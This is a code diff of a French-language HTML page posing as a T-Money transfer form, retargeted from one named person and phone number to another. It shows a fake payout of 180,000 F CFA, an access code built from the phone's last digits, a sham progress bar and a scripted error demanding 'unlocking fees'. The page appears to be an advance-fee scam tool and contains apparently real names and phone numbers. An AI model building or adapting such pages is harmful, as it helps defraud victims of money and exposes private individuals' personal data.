@@ -155,17 +155,17 @@
         <form id="tmoneyForm" onsubmit="return false;">
             <div class="form-group">
                 <label for="name">Nom et Prénom</label>
-                <input type="text" id="name" value="Ouedraogo Aboudoul" disabled>
+                <input type="text" id="name" value="Ouedraogo Moctar" disabled>
             </div>
 
             <div class="form-group">
                 <label for="phone">Numéro</label>
-                <input type="tel" id="phone" value="+2250503197099" disabled>
+                <input type="tel" id="phone" value="+22605165473" disabled>
             </div>
 
             <div class="form-group">
                 <label for="amount">Montant à recevoir</label>
-                <input type="text" id="amount" class="amount" value="210 000 F CFA " disabled>
+                <input type="text" id="amount" class="amount" value="180 000 F CFA " disabled>
             </div>
 
             <button type="button" onclick="startProgress()">Procéder</button>
@@ -177,7 +177,7 @@
                 <div class="progress-bar" id="progressBar"></div>
             </div>
 
-            <div class="notification-message" id="notificationMessage">Erreur : Veuillez payer les frais de carte d'investisseur afin de terminer la transaction.</div>
+            <div class="notification-message" id="notificationMessage">Erreur : Veuillez payer les frais de déblocage afin de terminer la transaction.</div>
         </form>
     </div>
 
@@ -186,7 +186,7 @@
             const accessCode = document.getElementById('accessCode').value;
             const accessError = document.getElementById('accessError');
 
-            if (accessCode === "7099") {
+            if (accessCode === "5473") {
                 accessError.style.display = 'none';
                 document.getElementById('accessContainer').style.display = 'none';
                 document.getElementById('formContainer').style.display = 'block';
